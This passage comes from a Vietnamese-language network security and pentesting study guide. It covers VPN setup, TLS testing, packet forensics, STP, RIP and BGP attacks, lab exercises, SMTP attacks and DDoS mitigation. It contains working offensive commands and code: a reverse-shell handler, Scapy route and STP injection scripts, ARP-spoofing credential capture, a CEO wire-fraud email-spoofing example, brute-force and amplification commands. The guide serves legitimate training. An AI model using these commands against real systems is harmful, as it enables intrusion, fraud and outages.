   - Kernel-level (nhanh hơn OpenVPN)

4. SSH VPN (Poor man's VPN)
   - ssh -D 1080 (SOCKS proxy)
   - sshuttle (transparent proxy)
```

### WireGuard Setup

```bash
# === Server ===
# Tạo key pair
wg genkey | tee server_private.key | wg pubkey > server_public.key

# Config: /etc/wireguard/wg0.conf
[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = <server_private_key>
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32

# Start
sudo wg-quick up wg0

# === Client ===
wg genkey | tee client_private.key | wg pubkey > client_public.key

[Interface]
Address = 10.0.0.2/24
PrivateKey = <client_private_key>
DNS = 1.1.1.1

[Peer]
PublicKey = <server_public_key>
Endpoint = server-ip:51820
AllowedIPs = 0.0.0.0/0    # Route tất cả traffic qua VPN
PersistentKeepalive = 25

sudo wg-quick up wg0
```

### OpenVPN

```bash
# Quick setup với easy-rsa
# Server
apt install openvpn easy-rsa
make-cadir /etc/openvpn/easy-rsa
cd /etc/openvpn/easy-rsa
./easyrsa init-pki
./easyrsa build-ca
./easyrsa gen-req server nopass
./easyrsa sign-req server server
./easyrsa gen-dh
openvpn --genkey secret ta.key

# Client
./easyrsa gen-req client1 nopass
./easyrsa sign-req client client1

# Dùng script tự động: https://github.com/angristan/openvpn-install
```

## 9.3 TLS/SSL Deep Dive

### Certificate Chain

```
Root CA (Self-signed, pre-installed trong OS/browser)
  └── Intermediate CA (Signed by Root)
        └── Server Certificate (Signed by Intermediate)
              └── Domain: example.com
```

### TLS Testing

```bash
# Xem certificate
openssl s_client -connect example.com:443
openssl s_client -connect example.com:443 -showcerts

# Xem certificate details
echo | openssl s_client -connect example.com:443 2>/dev/null | \
  openssl x509 -noout -text

# Check expiry
echo | openssl s_client -connect example.com:443 2>/dev/null | \
  openssl x509 -noout -dates

# Test SSL/TLS vulnerabilities
# testssl.sh (comprehensive)
./testssl.sh example.com

# sslscan
sslscan example.com

# Nmap SSL scripts
nmap --script ssl-enum-ciphers -p 443 example.com
nmap --script ssl-heartbleed -p 443 example.com
nmap --script ssl-poodle -p 443 example.com
```

### SSL/TLS Attacks

```
1. POODLE (SSLv3) - Padding Oracle
2. BEAST (TLS 1.0) - CBC mode attack
3. Heartbleed (OpenSSL) - Memory leak
4. CRIME/BREACH - Compression side-channel
5. DROWN - SSLv2 cross-protocol attack
6. ROBOT - RSA padding oracle
7. Certificate Pinning Bypass - Cho mobile app testing
```

### Certificate Pinning Bypass (Mobile)

```bash
# Android
# Dùng Frida
frida -U -f com.target.app -l bypass_ssl_pinning.js

# Hoặc Objection
objection -g com.target.app explore
> android sslpinning disable

# iOS
# Dùng SSL Kill Switch 2 (jailbroken)
# Hoặc Frida script
```

## 9.4 Network Forensics

### Phân tích PCAP

```bash
# Tshark (Wireshark CLI)
# Extract HTTP objects
tshark -r capture.pcap --export-objects http,exported_files

# Extract files từ SMB
tshark -r capture.pcap --export-objects smb,exported_files

# Conversations
tshark -r capture.pcap -z conv,tcp

# Protocol hierarchy
tshark -r capture.pcap -z io,phs

# DNS queries
tshark -r capture.pcap -Y dns.qry.name -T fields -e dns.qry.name | sort -u

# HTTP requests
tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri

# Credentials (plaintext)
tshark -r capture.pcap -Y 'http.request.method == POST' -T fields \
  -e http.host -e http.request.uri -e urlencoded-form.value

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0

# === NetworkMiner ===
# GUI tool, tự động extract files, images, credentials từ pcap

# === Zeek (Bro) ===
# Network analysis framework
zeek -r capture.pcap
# Tạo ra nhiều log files: conn.log, http.log, dns.log, files.log, v.v.
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p
cat http.log | zeek-cut host uri
cat dns.log | zeek-cut query
```

## 9.5 IPv6 Attacks

```bash
# IPv6 scanning
nmap -6 fe80::1%eth0

# IPv6 neighbor discovery
sudo ip -6 neigh show

# THC-IPv6 toolkit
alive6 eth0                    # Discover IPv6 hosts
fake_router6 eth0              # Fake router advertisement
parasite6 eth0                 # ARP spoofing equivalent for IPv6
redir6 eth0                    # Redirect traffic

# IPv6 MITM (dùng NDP spoofing, KHÔNG phải ARP — ARP chỉ có trong IPv4)
sudo bettercap
> set net.sniff.local true
> net.probe on
> set ndp.spoof.targets fe80::1
> ndp.spoof on
```

## 9.6 Network Automation & Scripting

### Python Networking

```python
import socket
import struct
import subprocess

# === TCP Client ===
def tcp_connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, port))
        s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
        response = s.recv(4096)
        return response.decode(errors='ignore')
    except Exception as e:
        return str(e)
    finally:
        s.close()

# === Port Scanner (multi-threaded) ===
import concurrent.futures

def scan_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((host, port))
    s.close()
    if result == 0:
        return port
    return None

def port_scan(host, ports):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    return sorted(open_ports)

# === Network Sniffer ===
def simple_sniffer():
    # Raw socket (Linux only, needs root)
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    while True:
        raw_data, addr = s.recvfrom(65535)
        # Parse Ethernet header
        dest_mac, src_mac, eth_proto = struct.unpack('! 6s 6s H', raw_data[:14])
        print(f"Src: {mac_format(src_mac)} → Dst: {mac_format(dest_mac)} Proto: {eth_proto}")

def mac_format(mac_bytes):
    return ':'.join(f'{b:02x}' for b in mac_bytes)

# === Reverse Shell Handler ===
import threading

def handle_client(client_socket):
    while True:
        cmd = input("Shell> ")
        if cmd.lower() == "exit":
            client_socket.send(b"exit\n")
            break
        client_socket.send(cmd.encode() + b"\n")
        response = client_socket.recv(65535)
        print(response.decode(errors='ignore'))
    client_socket.close()

def listener(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    print(f"[*] Listening on port {port}")
    client, addr = server.accept()
    print(f"[+] Connection from {addr}")
    handle_client(client)
```

### Bash Network Scripts

```bash
# === Quick subnet scanner ===
#!/bin/bash
subnet=$1  # e.g., 192.168.1
for host in $(seq 1 254); do
    (ping -c 1 -W 1 $subnet.$host &>/dev/null && \
     echo "[+] $subnet.$host is alive") &
done
wait

# === Port scanner ===
#!/bin/bash
target=$1
for port in $(seq 1 1024); do
    (echo >/dev/tcp/$target/$port) 2>/dev/null && \
    echo "[+] Port $port is open"
done

# === Banner grabber ===
#!/bin/bash
target=$1
for port in 21 22 25 80 443 3306 8080; do
    banner=$(echo "" | nc -w 2 $target $port 2>/dev/null | head -1)
    if [ -n "$banner" ]; then
        echo "Port $port: $banner"
    fi
done
```

---

# PHẦN 10: LAB THỰC HÀNH

## 10.1 Dựng Lab

### Virtualization

```
1. VirtualBox / VMware Workstation (Free)
   - Tải Kali Linux: https://www.kali.org/get-kali/
   - Tải Windows: https://developer.microsoft.com/windows/downloads/virtual-machines/
   - Tải vulnerable VMs (xem bên dưới)

2. Network modes:
   - NAT: VM ra Internet qua host
   - Host-only: Chỉ VM ↔ Host
   - Internal Network: Chỉ VM ↔ VM
   - Bridged: VM = device trên mạng thật

3. Lab setup recommended:
   - Kali Linux (attacker)
   - Windows 10/11 (victim)
   - Ubuntu Server (victim)
   - pfSense (firewall/router)
   - Network: Host-only hoặc Internal Network
```

### Vulnerable Machines cho Practice

```
=== Beginner ===
1. Metasploitable 2
   - Nhiều service lỗi: FTP, SSH, Telnet, HTTP, SMB, MySQL
   - Tải: https://sourceforge.net/projects/metasploitable/

2. DVWA (Damn Vulnerable Web Application)
   - Web app vulnerabilities
   - Docker: docker run -d -p 80:80 vulnerables/web-dvwa

3. TryHackMe (Online)
   - https://tryhackme.com
   - Rooms: "Network Fundamentals", "Nmap", "Wireshark"

=== Intermediate ===
4. HackTheBox (Online)
   - https://hackthebox.com
   - Machines với nhiều mức độ

5. VulnHub (Offline VMs)
   - https://vulnhub.com
   - Kipling, Brainpan, SickOs, Stapler

6. DVCP (Damn Vulnerable Cloud Platform)
   - Cloud security practice

=== Advanced ===
7. Active Directory Lab
   - 1 Windows Server (Domain Controller)
   - 2-3 Windows 10 (domain-joined)
   - Cài đặt: DVAD, GOAD (Game of Active Directory)

8. Cyber Range
   - RangeForce, Immersive Labs (commercial)
```

## 10.2 Network Lab Exercises

### Lab 1: Network Discovery & Scanning

```bash
# Mục tiêu: Tìm tất cả host và service trong mạng lab

# Bước 1: Tìm subnet
ip addr show

# Bước 2: ARP scan
sudo arp-scan -l

# Bước 3: Nmap host discovery
nmap -sn 192.168.56.0/24

# Bước 4: Port scan các host tìm được
nmap -sS -sV -sC -p- -oA lab1_scan 192.168.56.101

# Bước 5: Phân tích kết quả
# Xác định: OS, services, versions, potential vulnerabilities
```

### Lab 2: MITM Attack

```bash
# Mục tiêu: ARP spoof và capture credentials

# Bước 1: Bật IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Bước 2: ARP spoof
sudo arpspoof -i eth0 -t 192.168.56.101 192.168.56.1 &
sudo arpspoof -i eth0 -t 192.168.56.1 192.168.56.101 &

# Bước 3: Capture traffic
sudo tcpdump -i eth0 -A -s 0 'port 80' -w mitm_capture.pcap

# Bước 4: Trên victim, truy cập HTTP login page

# Bước 5: Phân tích capture với Wireshark
# Follow TCP stream → tìm credentials

# Bước 6: Cleanup
kill %1 %2
echo 0 > /proc/sys/net/ipv4/ip_forward
```

### Lab 3: Pivoting

```bash
# Setup:
# Attacker (10.10.10.5) → Pivot Host (10.10.10.10 + 172.16.0.10) → Internal (172.16.0.20)

# Bước 1: Compromise pivot host (ví dụ qua SSH)
ssh user@10.10.10.10

# Bước 2: Discover internal network
# Trên pivot host:
ip addr show     # Thấy 2 interfaces
for i in $(seq 1 254); do ping -c 1 -W 1 172.16.0.$i &>/dev/null && echo "172.16.0.$i alive"; done

# Bước 3: SSH tunnel
# Trên attacker:
ssh -D 1080 user@10.10.10.10

# Bước 4: Scan internal
proxychains nmap -sT -Pn -p 22,80,445,3389 172.16.0.20

# Bước 5: Access internal service
proxychains firefox    # Truy cập http://172.16.0.20
```

### Lab 4: Firewall Configuration

```bash
# Mục tiêu: Cấu hình iptables bảo vệ server

# Bước 1: Default deny
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Bước 2: Allow essential
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Bước 3: Test từ attacker
nmap -sS 192.168.56.101   # Chỉ thấy port 22, 80

# Bước 4: Thêm rate limiting
sudo iptables -I INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
sudo iptables -I INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

# Bước 5: Test brute force → bị block sau 3 attempts
hydra -l root -P small_wordlist.txt ssh://192.168.56.101
```

## 10.3 Certification Paths

```
Beginner → Advanced:

1. CompTIA Network+
   - Nền tảng networking
   - Cần cho security role

2. CompTIA Security+
   - Security fundamentals
   - Nhiều công ty yêu cầu

3. CEH (Certified Ethical Hacker)
   - Ethical hacking methodology
   - Breadth over depth

4. eJPT (eLearnSecurity Junior Penetration Tester)
   - Hands-on, practical
   - Entry-level pentest cert

5. OSCP (Offensive Security Certified Professional)
   - Gold standard cho pentest
   - 24h hands-on exam
   - BẮT BUỘC phải có nếu muốn làm pentest

6. CRTP (Certified Red Team Professional)
   - Active Directory attacks
   - Pentester Academy

7. OSEP (Offensive Security Experienced Penetration Tester)
   - Advanced pentesting
   - Evasion, custom exploits

8. CRTO (Certified Red Team Operator)
   - Red team operations
   - C2, evasion, OPSEC
```

## 10.4 Methodology

### Network Penetration Testing Methodology

```
Phase 1: Reconnaissance
├── Passive
│   ├── OSINT (Shodan, Censys, Google Dorks)
│   ├── DNS enumeration (amass, subfinder)
│   ├── WHOIS lookup
│   └── Social engineering research
└── Active
    ├── Host discovery (nmap -sn)
    ├── Port scanning (nmap -sS -p-)
    ├── Service enumeration (nmap -sV -sC)
    └── OS fingerprinting (nmap -O)

Phase 2: Vulnerability Analysis
├── Automated scanning (Nessus, OpenVAS)
├── Manual verification
├── Research CVEs for identified services
└── Check default credentials

Phase 3: Exploitation
├── Network attacks (MITM, relay)
├── Service exploitation (Metasploit, manual)
├── Password attacks (spray, brute force)
└── Client-side attacks (phishing, evil twin)

Phase 4: Post-Exploitation
├── Privilege escalation
├── Persistence
├── Credential harvesting
├── Lateral movement
├── Pivoting to internal networks
└── Data exfiltration

Phase 5: Reporting
├── Executive summary
├── Technical findings
├── Risk ratings (CVSS)
├── Remediation recommendations
└── Evidence (screenshots, logs)
```

---

# PHẦN 11: ROUTING & SWITCHING NÂNG CAO

## 11.1 TCP/IP Model vs OSI Model

```
OSI Model (7 layers)          TCP/IP Model (4 layers)
─────────────────────         ──────────────────────
Application  (7)  ─┐
Presentation (6)   ├────→    Application
Session      (5)  ─┘
Transport    (4)  ──────→    Transport
Network      (3)  ──────→    Internet
Data Link    (2)  ─┐
Physical     (1)  ─┘────→    Network Access

Thực tế, mạng Internet chạy theo TCP/IP model.
OSI là mô hình lý thuyết để học và tham khảo.
TCP/IP model thực dụng hơn: gộp Layer 5-6-7 → Application,
gộp Layer 1-2 → Network Access.
```

## 11.2 Spanning Tree Protocol (STP) - Chi tiết

### STP là gì?
Khi switch kết nối với nhau tạo loop → broadcast storm (frame loop vô hạn → sập mạng). STP ngăn loop bằng cách disable một số port.

### Cách STP hoạt động

```
1. Bầu Root Bridge (switch có Bridge ID nhỏ nhất)
   Bridge ID = Priority (16 bit, mặc định 32768, tăng/giảm theo bội 4096) + MAC Address

2. Mỗi non-root switch chọn Root Port (port gần root nhất)
   Tính bằng: path cost (bandwidth) đến root bridge

3. Mỗi segment chọn Designated Port (port forward traffic)

4. Tất cả port khác → Blocking state (không forward)

Port States:
  Blocking    → Không forward, chỉ nhận BPDU
  Listening   → Gửi/nhận BPDU, không forward data
  Learning    → Học MAC address, chưa forward data
  Forwarding  → Forward data bình thường
  Disabled    → Admin shutdown

Convergence time: 30-50 giây (STP cổ điển)
RSTP (Rapid STP - 802.1w): <6 giây
MSTP (Multiple STP - 802.1s): 1 instance per VLAN group
```

### STP Attacks

```bash
# === Root Bridge Takeover ===
# Nguyên lý: Gửi BPDU với priority thấp hơn → trở thành root bridge
# → Tất cả traffic đi qua attacker

# Dùng Yersinia
yersinia stp -attack 4 -interface eth0    # Become root bridge

# Dùng Scapy
from scapy.all import *
# Gửi BPDU với priority = 0 (thấp nhất)
frame = Dot3(dst="01:80:c2:00:00:00", src="AA:BB:CC:DD:EE:FF") / \
        LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
        STP(bpdutype=0, rootmac="AA:BB:CC:DD:EE:FF", rootid=0,
            bridgemac="AA:BB:CC:DD:EE:FF", bridgeid=0)
sendp(frame, iface="eth0", loop=1, inter=2)

# === BPDU Flood ===
# Gửi hàng ngàn BPDU → switch overload
yersinia stp -attack 2 -interface eth0

# === Phòng chống ===
# BPDU Guard: Nếu nhận BPDU trên access port → shutdown port
# (config)# interface range gi0/1-24
# (config-if-range)# spanning-tree bpduguard enable

# Root Guard: Không cho port trở thành root port
# (config-if)# spanning-tree guard root

# PortFast: Skip STP cho access port (không chờ 30s)
# (config-if)# spanning-tree portfast
```

## 11.3 Routing Protocols & Attacks

### Distance Vector vs Link State

```
Distance Vector (RIP) / Hybrid (EIGRP):
- Mỗi router chỉ biết neighbor trực tiếp
- Gửi routing table cho neighbor định kỳ
- Chậm converge, dễ loop
- "Đường đi theo lời kể" - tin neighbor

Link State (OSPF, IS-IS):
- Mỗi router biết TOÀN BỘ topology
- Gửi Link State Advertisement (LSA) cho tất cả
- Nhanh converge
- "Tự tính đường đi" - dùng Dijkstra algorithm

Path Vector (BGP):
- Dùng cho inter-AS routing (giữa các ISP)
- Gửi full path (AS path) → tránh loop
- Policy-based routing
```

### RIP (Routing Information Protocol)

```
Version: RIPv1 (classful, broadcast), RIPv2 (classless, multicast 224.0.0.9)
Metric: Hop count (max 15, 16 = unreachable)
Timer: Update 30s, Invalid 180s, Flush 240s
Port: UDP 520

# Tấn công RIP: Route Injection
# Gửi RIP update giả → router thêm route sai → traffic đi lệch
from scapy.all import *
rip = IP(dst="224.0.0.9") / UDP(sport=520, dport=520) / \
      RIP() / RIPEntry(AF=2, addr="10.0.0.0", mask="255.0.0.0",
                       nexthop="192.168.1.200", metric=1)
send(rip)

# Phòng chống: RIP authentication (MD5)
```

### OSPF (Open Shortest Path First)

```
Areas: Backbone (Area 0), Stub, NSSA
Multicast: 224.0.0.5 (All OSPF), 224.0.0.6 (DR/BDR)
Protocol: IP Protocol 89
Metric: Cost = Reference BW / Interface BW

Router types:
- Internal Router: Tất cả interfaces trong 1 area
- ABR (Area Border Router): Nối 2+ areas
- ASBR (AS Boundary Router): Nối OSPF với routing protocol khác
- DR (Designated Router): Giảm adjacency trong multi-access network

# OSPF Attacks:
# 1. LSA Injection: Inject fake LSA → thay đổi routing
# 2. Phantom Router: Join OSPF area, trở thành DR
# 3. MaxAge LSA: Gửi LSA với MaxAge → route bị xóa

# Dùng Loki framework cho OSPF attacks
# Hoặc FRRouting để join OSPF domain

# Phòng chống:
# OSPF authentication (MD5 hoặc SHA)
# (config-router)# area 0 authentication message-digest
# (config-if)# ip ospf message-digest-key 1 md5 SECRET_KEY

# TTL Security (chỉ nhận packet TTL=255 → phải từ neighbor trực tiếp)
# (config-router)# ttl-security all-interfaces hops 1
```

### BGP (Border Gateway Protocol) - Internet Backbone

```
Type: Path Vector, TCP port 179
Dùng cho: Routing giữa các AS (Autonomous System) trên Internet
Mỗi ISP, tổ chức lớn = 1 AS, có ASN (AS Number)

eBGP: Giữa AS khác nhau
iBGP: Trong cùng AS

BGP Decision Process (thứ tự ưu tiên):
1. Highest Weight (Cisco proprietary)
2. Highest Local Preference
3. Locally originated routes
4. Shortest AS Path
5. Lowest Origin type (IGP < EGP < Incomplete)
6. Lowest MED
7. eBGP over iBGP
8. Lowest IGP metric to next-hop
9. Oldest route
10. Lowest Router ID
```

### BGP Hijacking

```
Nguyên lý: BGP dựa trên TRUST. Khi AS announce prefix, neighbor tin.
Attacker announce prefix của victim → traffic bị redirect.

Ví dụ thực tế:
- 2018: MyEtherWallet bị BGP hijack → redirect DNS → steal crypto
- 2008: Pakistan Telecom hijack YouTube prefix (accident)

Loại BGP Hijack:
1. Prefix Hijack: Announce CÙNG prefix → traffic bị chia
2. Sub-prefix Hijack: Announce prefix CỤ THỂ HƠN (ví dụ /25 thay vì /24)
   → More specific = preferred → chiếm hết traffic
3. AS Path Manipulation: Prepend AS path giả

# Monitoring:
# BGPStream: https://bgpstream.com
# RIPE RIS: https://ris.ripe.net
# BGP Toolkit: https://bgp.he.net

# Phòng chống:
# RPKI (Resource Public Key Infrastructure): Validate route origin
# ROA (Route Origin Authorization): Signed object saying "AS X is authorized to announce prefix Y"
# IRR (Internet Routing Registry): Database of routing policies
# BGPSec: Crypto validation of entire AS path (chưa deploy rộng)
```

### EIGRP (Open standard - RFC 7868, trước đây Cisco proprietary)

```
Protocol: IP Protocol 88
Metric: Composite (Bandwidth, Delay, Reliability, Load)
Multicast: 224.0.0.10
Dùng DUAL algorithm

# EIGRP Attack: Neighborhip injection
# Join EIGRP domain → inject routes
# Tool: Loki, FRRouting, Scapy

# Phòng chống: EIGRP authentication (MD5/SHA)
```

## 11.4 Network Topology Design

```
=== Common Topologies ===

Star:
  Tất cả node kết nối vào 1 switch trung tâm
  Pros: Dễ quản lý, lỗi 1 node không ảnh hưởng khác
  Cons: Single point of failure (switch trung tâm)

Spine-Leaf (Modern Data Center):
  Leaf switches: Kết nối servers
  Spine switches: Kết nối tất cả leaf switches
  Mỗi leaf kết nối TẤT CẢ spine (full mesh)
  Pros: Predictable latency, horizontal scaling
  Cons: Nhiều cáp, chi phí cao

  ┌────────┐  ┌────────┐  ┌────────┐
  │ Spine1 │  │ Spine2 │  │ Spine3 │
  └─┬──┬─┬─┘  └─┬──┬─┬─┘  └─┬──┬─┬─┘
    │  │  │      │  │  │      │  │  │
    │  │  └──────┘  │  └──────┘  │  │
    │  └─────┐ ┌────┘  ┌─────┘  │  │
  ┌─┴──┴─────┴─┴───────┴────────┴──┴─┐
  │ Leaf1 │  │ Leaf2 │  │ Leaf3 │     │
  └───┬───┘  └───┬───┘  └───┬───┘
   Servers    Servers    Servers

Three-Tier (Enterprise Classic):
  Core → Distribution → Access
  Core: High-speed backbone
  Distribution: Policy, filtering, inter-VLAN routing
  Access: End-user connectivity

DMZ Architecture:
  Internet → Firewall → DMZ (web servers, mail servers)
                       → Internal Network (workstations, DB)
  DMZ = Demilitarized Zone: vùng đệm giữa Internet và Internal
```

## 11.5 Load Balancing

```
Layer 4 (Transport) Load Balancer:
  Dựa trên IP + Port
  Nhanh, ít overhead
  Ví dụ: HAProxy (TCP mode), LVS, F5

Layer 7 (Application) Load Balancer:
  Dựa trên nội dung HTTP (URL, header, cookie)
  Có thể: SSL termination, caching, WAF
  Ví dụ: HAProxy (HTTP mode), Nginx, AWS ALB, Traefik

Algorithms:
  Round Robin        → Lần lượt từng server
  Weighted Round Robin → Server mạnh nhận nhiều hơn
  Least Connections  → Server ít connection nhất
  IP Hash            → Cùng client IP → cùng server (session persistence)
  Random             → Chọn ngẫu nhiên

# HAProxy config ví dụ
frontend http_front
    bind *:80
    default_backend http_back

backend http_back
    balance roundrobin
    server web1 192.168.1.10:80 check
    server web2 192.168.1.11:80 check
    server web3 192.168.1.12:80 check

# Security góc nhìn:
# Load balancer là single point of failure nếu không HA
# Health check bypass: respond 200 nhưng app lỗi
# Session persistence → session fixation risk
# X-Forwarded-For header spoofing
```

---

# PHẦN 12: EMAIL SECURITY & SMTP ATTACKS

## 12.1 SMTP (Simple Mail Transfer Protocol) - Port 25/465/587

### SMTP hoạt động thế nào

```
Sender → SMTP Client → SMTP Server (MTA) ──→ Recipient MTA → POP3/IMAP → Recipient

SMTP Session:
┌──────────────────────────────────────────┐
│ Client: HELO mail.attacker.com           │
│ Server: 250 Hello                        │
│ Client: MAIL FROM:<admin@target.com>     │
│ Server: 250 OK                           │
│ Client: RCPT TO:<victim@target.com>      │
│ Server: 250 OK                           │
│ Client: DATA                             │
│ Server: 354 Start mail input             │
│ Client: Subject: Important               │
│         From: admin@target.com           │
│         To: victim@target.com            │
│                                          │
│         This is the email body.           │
│         .                                │
│ Server: 250 OK                           │
│ Client: QUIT                             │
└──────────────────────────────────────────┘

Ports:
  25  → SMTP (server-to-server relay)
  465 → SMTPS (implicit TLS, re-standardized RFC 8314/2018)
  587 → Submission (client-to-server, STARTTLS)
```

### SMTP Attacks

```bash
# === Email Spoofing ===
# SMTP không verify sender identity (MAIL FROM có thể giả)

# Dùng swaks (Swiss Army Knife for SMTP)
swaks --to victim@target.com \
      --from ceo@target.com \
      --server mail.target.com \
      --header "Subject: Urgent - Wire Transfer" \
      --body "Please transfer $50,000 to account..."

# Dùng sendemail
sendemail -f ceo@target.com -t victim@target.com \
          -u "Urgent" -m "Body text" \
          -s mail.target.com

# Kiểm tra SMTP open relay
nmap --script smtp-open-relay -p 25 mail.target.com

# SMTP user enumeration
# VRFY command (verify user exists)
nmap --script smtp-enum-users -p 25 mail.target.com
smtp-user-enum -M VRFY -U users.txt -t mail.target.com

# SMTP NTLM authentication capture
# Dùng Responder hoặc Metasploit
```

### Email Security Headers (SPF, DKIM, DMARC)

```
=== SPF (Sender Policy Framework) ===
DNS TXT record chỉ định server nào được phép gửi email cho domain.

target.com TXT "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com -all"

v=spf1           → SPF version 1
ip4:203.0.113.0  → Cho phép dải IP này gửi email
include:         → Cho phép SPF record của domain khác
-all             → Reject tất cả server không nằm trong list
~all             → Soft fail (đánh dấu nhưng vẫn nhận)
?all             → Neutral (không check)

# Kiểm tra SPF
dig target.com TXT | grep spf

=== DKIM (DomainKeys Identified Mail) ===
Server ký email bằng private key, receiver verify bằng public key trong DNS.

DNS record: selector._domainkey.target.com TXT "v=DKIM1; k=rsa; p=PUBLIC_KEY..."

# Kiểm tra DKIM
dig selector._domainkey.target.com TXT

=== DMARC (Domain-based Message Authentication) ===
Policy nói receiver làm gì khi email fail SPF/DKIM.

_dmarc.target.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@target.com"

p=none     → Không làm gì (chỉ report)
p=quarantine → Đưa vào spam
p=reject   → Reject email
rua=       → Gửi aggregate report đến đâu

# Kiểm tra DMARC
dig _dmarc.target.com TXT

# Kiểm tra toàn bộ email security
# https://mxtoolbox.com/
```

## 12.2 POP3 / IMAP

```
POP3 (Port 110/995):
  Download email về client, XÓA trên server
  Đơn giản, offline access
  POP3S = POP3 + TLS (port 995)

IMAP (Port 143/993):
  Đồng bộ email giữa client và server
  Email ở trên server
  IMAPS = IMAP + TLS (port 993)

# Brute force
hydra -l user@target.com -P passwords.txt pop3://mail.target.com
hydra -l user@target.com -P passwords.txt imap://mail.target.com

# Đọc email sau khi có credentials
# POP3 manual
nc mail.target.com 110
USER admin@target.com
PASS password
LIST
RETR 1

# IMAP manual
nc mail.target.com 143
a1 LOGIN admin@target.com password
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
```

---

# PHẦN 13: DDoS - HIỂU VÀ PHÒNG CHỐNG

## 13.1 DDoS Taxonomy

```
┌─────────────────────────────────────────────────────────────┐
│                     DDoS Attack Types                       │
├──────────────────┬──────────────────┬───────────────────────┤
│ Volumetric       │ Protocol         │ Application Layer     │
│ (Layer 3/4)      │ (Layer 3/4)      │ (Layer 7)             │
├──────────────────┼──────────────────┼───────────────────────┤
│ UDP Flood        │ SYN Flood        │ HTTP Flood            │
│ DNS Amplification│ ACK Flood        │ Slowloris             │
│ NTP Amplification│ Ping of Death    │ RUDY (R-U-Dead-Yet)   │
│ SSDP Amplification│ Smurf Attack   │ DNS Water Torture     │
│ Memcached Ampl.  │ TCP Fragment     │ WordPress Pingback    │
│ CHARGEN          │ IP Null Attack   │ API Abuse             │
└──────────────────┴──────────────────┴───────────────────────┘

Volumetric: Saturate bandwidth (Gbps)
Protocol: Exhaust server/firewall state tables (PPS)
Application: Exhaust application resources (RPS)
```

## 13.2 Amplification Attacks (Chi tiết)

```
Nguyên lý: Gửi request nhỏ với source IP giả (victim IP)
→ Server trả response LỚN về victim IP

Protocol    Amplification Factor    Port
──────────  ────────────────────    ────
Memcached   51,000x                 11211
NTP         556x                    123
DNS         28-54x                  53
SSDP        30x                     1900
CHARGEN     358x                    19
SNMP        6x                      161
LDAP        46-55x                  389

# DNS Amplification
# Request nhỏ (60 bytes) → Response lớn (3000+ bytes)
# Spoofed source IP = victim
dig ANY google.com @open-resolver     # Response ~3KB

# NTP Amplification
# monlist command trả về list 600 clients gần nhất
ntpdc -n -c monlist open-ntp-server   # Response ~100x request

# Memcached Amplification (51,000x!)
# stats command hoặc get large_key
# 2018: GitHub bị 1.35 Tbps DDoS qua Memcached
```

## 13.3 Application Layer DDoS

```bash
# === Slowloris ===
# Nguyên lý: Mở nhiều connection, gửi HTTP header CHẬM (không bao giờ hoàn thành)
# → Server giữ connection open → hết connection pool

# Cách hoạt động:
# 1. Mở connection
# 2. Gửi: GET / HTTP/1.1\r\n
# 3. Gửi: X-Header: value\r\n    (cứ mỗi 15 giây gửi 1 header)
# 4. KHÔNG BAO GIỜ gửi \r\n cuối cùng (kết thúc header)
# → Server chờ mãi

# Tool (chỉ dùng trong lab):
# slowloris.py
# slowhttptest

# === HTTP Flood ===
# Gửi hàng triệu HTTP GET/POST request hợp lệ
# Khó phân biệt với traffic thật

# === DNS Water Torture ===
# Gửi query cho random subdomain: abc123.target.com
# DNS server phải resolve (cache miss) → overload authoritative DNS

# === RUDY (R-U-Dead-Yet) ===
# POST request với Content-Length lớn
# Gửi body 1 byte mỗi 10 giây → connection mở mãi
```

## 13.4 DDoS Mitigation

```
1. Network Level:
   - Anycast: Phân tán traffic đến nhiều PoP (Point of Presence)
   - Blackhole Routing: Drop traffic đến IP bị tấn công (last resort)
   - Rate Limiting: Giới hạn request/second per IP
   - ACL: Block known bad IPs
   - BGP Flowspec: Inject firewall rules qua BGP

2. Scrubbing Services:
   - Cloudflare, AWS Shield, Akamai Prolexic
   - Traffic đi qua scrubbing center → lọc → forward clean traffic
   - Hoạt động: DNS trỏ về scrubbing center thay vì origin

3. Application Level:
   - WAF rules
   - CAPTCHA cho suspicious traffic
   - JavaScript challenge (bot không chạy JS)
   - Rate limiting per endpoint
   - Connection timeout giảm

4. Infrastructure:
   - Over-provisioning bandwidth
   - CDN (Content Delivery Network) phân tán load
   - Load balancer với health check
   - Auto-scaling (cloud)

5. Anti-Slowloris:
   - Apache: mod_reqtimeout, mod_qos
   - Nginx: mặc định resistant (event-based, không giữ thread per connection)
